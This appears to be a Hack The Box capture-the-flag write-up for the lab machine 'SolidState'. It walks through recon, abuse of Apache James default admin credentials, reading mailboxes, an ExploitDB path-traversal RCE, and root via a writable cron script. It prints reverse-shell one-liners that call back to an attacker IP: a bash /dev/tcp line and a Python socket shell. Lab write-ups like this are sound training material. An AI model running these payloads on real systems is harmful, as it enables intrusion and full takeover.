# SolidState [HTB](https://app.hackthebox.com/machines/SolidState)
![solidstate-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/solidstate-01.png)


## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 solidstate.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/ports-02.png)

From here, I run a service and version detection scan on the found ports:

```bash
nmap -p 22,25,80,110,119,4555 -sCV solidstate.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/nmap-res-03.png)

We have the following:

+ An SSH server on port 22.
+ An SMTP server on port 25.
+ An Apache V2.4.25 on port 80.
+ A possible POP3 server on port 110.
+ A possible NNTP service on port 119.
+ A possible rsip service on port 4555.

We can see that `nmap` had a bit of an issue enumerating ports 110, 119, 4555, as well as port 25 where `nmap` wasn't able to establish a connection. That's okay, we will enumerate these ports manually. What `nmap` did manage to find was a web server on port 80, i'm thinking we should start with the web server to see what information we can gather and move on to the other services as needed.


### Apache Port 80

Let's start by opening the website at `http://solidstate.htb`:

![site-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/site-04.png)

The site offers penetration testing services and they mention social engineering severeal times in the main page. 

Down at the buttom there is an option to contact the company, and that's where they disclose an email address:

![email-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/email-05.png)

This could be useful in the future. 

While I was going through the website I also ran a dierectory and file scan with:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-
2.3-medium.txt -u http://solidstate.htb/FUZZ -e .cgi,.txt,.xml,.html,.php,.js
```

Unfortunately, no interesting results came from that scan. 


To sum up, the site is primarly an informational, read-only reasource. I found no interactable features, nor any interesting files or subdirectories. 

Let's move on to the SMTP server.


### SMTP Port 25

I start by connecting to the SMTP server using:

```bash
nc -nv 10.129.75.25 25
```

The connection establishes and the server sends an interesting header:

![header-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/header-06.png)

This is rather unusual, so I searched the term `JAMES SMTP Server 2.3.2` on Google. This search returned many exploits for `Apache james server 2.3.2`. Primarly, I found [this](https://www.exploit-db.com/exploits/50347) RCE exploit from ExploitDB to be very interesting.

This exploit was written in Python 3. If we take a look at the source code, we can see the exploit is trying to establish a connection to the target on port 4555:

![source-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/source-07.png)

We know from our `nmap` scan that the our target has this port open. The comment here is referring to the `James Remote Administration Tool`, not the SMTP server. 


Let's leave the SMTP server for now and switch over to port 4555. 


### James Remote Administration Tool Port 4555

I wanted to see what will happen if I connected to the port using `nc`:

```bash
nc -nv 10.129.75.25 4555
```

![prompt-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/prompt-08.png)


And here we can see the header for the `James Remote Administration Tool`, after which we get prompted for credentials. 

If we take a look at the source code of the exploit, we can see that the exploit has default credential set for `root : root` : 

![creds-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/creds-09.png)

So I tried to use them to log in, and they worked:

![login-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/login-10.png)

This looks promising, but I wanted to learn more about the vulnerability and about the Apache James 2.3.2 server, so I found [this PDF](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf) that describes the vulnerability. 

+ What is the Apache James server? 

Apache James is an open source SMTP and POP3 mail transfer agent written entirely in Java. Apache James exposes an administration console allowing privileged users to configure and manage the server and tweak its functions (including user accounts). By default, the server is configured to listen for email transactions on network port 25 and administration transactions on port 4555. 

+ Why the exploit is possible? 

The vulnerability arises from an insecure default configuration and a lack of input validation in the server’s user creation mechanism; it allows an attacker to enqueue commands to execute when a user signs into the machine. 

In order to queue emails sent to a user account, the Apache James server creates a subdirectory based on the username value, to which it queues the emails. Therfore, by creating an account with a username of `../../../../../../../../etc/bash_completion.d`, emails sent to said user account will be stored in a subdirectory inside the bash completion directory tree. 

Becasue the bash completion direcotry tree is sourced by `/etc/bash.bashrc`, whatever is inside the bash compeletion directory will subsequantly be executed whenever a user logs on to the system. 

The above exploit creates an account with said username, and sends an email containing a reverse shell to said user. In order for this to execute, somebody needs to login to the system. 

So the question is how do we trigger a login event? 

There isn't a clear answer for this, but becasue we have access to the James adminstratrion panel we can manipulate user accounts, maybe we can find something interesting in thier emails.  

First, lets list out the available user accounts using the `listusers` command:

![listusers-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/listusers-11.png)

We can see 5 user accounts. Lets reset `john`'s password using the `setpassword` command:

![set-pwd-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/set-pwd-12.png)


Now, lets try to login to the POP3 client as `john`. 

```bash
telnet 10.129.75.52 110
```

![login-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/login-13.png)

Let's see if `john` has any emails, and if so let's read them:

![email-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/email-14.png)


Based on this email, `mindy` is a new user, and the admins sent her password via email. Let's take over her account the same way we did `john`'s and read her emails. 

I connect to the James adminstartion portal once again, reset `mindy`'s password and log back to the POP3 server as `mindy` and list out her emails:

![emails-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/emails-15.png)

The first one is an email welcoming `mindy` to the company, nothing super useful there. However the second email has her password:

![pass-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/pass-16.png)

We can use this password to login to the target as `mindy` via SSH:

![ssh-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/ssh-17.png)


This however, is a very limited shell, even running `cd` is not allowed. But now we have a way to login which will trigger our RCE, let's try it out.

First step is to create the malicious account, and send an email with a reverse shell payload, for this we can run our [exploit](https://www.exploit-db.com/exploits/50347) as such:

```bash
python3 james_rce.py 10.129.74.208 10.10.14.69 443
```

Where the syntax is as follows `python3 james_rce.py <remote_ip> <local_ip> <local_port>`.

![execute-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/execute-18.png)

Now we start the local listener for the reverse connection:

```bash
rlwrap nc -lnvp 443
```

Finally, we log in as `mindy` via SSH:

![login-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/login-19.png)

The login was successful, and immediately after we login, our RCE payload is executed via the stored email inside the bash completion directory tree, and this is what we are seeing here. This is the contet of the email sent by the exploit. This freezes the SSH connection, but it gives us a connection on our listener:

![shell-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/shell-20.png)

## Privilege Escalation

If we list the contents of our user's home directory we can see an unusual `bin` direcotry:

![bin-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/bin-21.png)

If we list the contents of the `bin` directory we can see three symlinks:

![symlink-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/symlink-22.png)

This is pretty unusual, and although the symlinks are owned by `root`, I dont see a clear way of exploting this. 

So I decided to have a look around the filesystem instead. Inside the `/opt` directory I found something interesting:

![opt-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/opt-23.png)

We can see a python script owned by root which is writable by everyone. But it doesnt have the SUID bit set, so how do we execute this as root? could there be a task running in the background? Let's use [pspy](https://github.com/DominicBreuker/pspy) to have a look at the running tasks.

I host the file via a python web server with:

```bash
python3 -m http.server 80
```

I then download the script from the target, add execute permissions, and run it:

```bash
wget http://10.10.14.69/pspy32
chmod +x pspy32
./pspy32
```

![job-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/job-24.png)

And here it is, it's probably a root cron job. To exploit this we need to add a reverse shell line inside this scrpt. 

At first I tried appending a reverse shell line to the end of the `/opt/tmp.py` file using:

```bash
echo 'os.system("bash -i >& /dev/tcp/10.10.14.69/445 0>&1")' >> tmp.py
```

But this didnt work. So instead I used the following command to overwrite the file entirely:

```bash
echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.69",445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' > tmp.py
```

![cat-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/cat-25.png)

I then setup the listner with:

```bash
rlwrap nc -lnvp 445
```

And after a few seconds I got a connection:

![root-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SolidState/img/root-26.png)
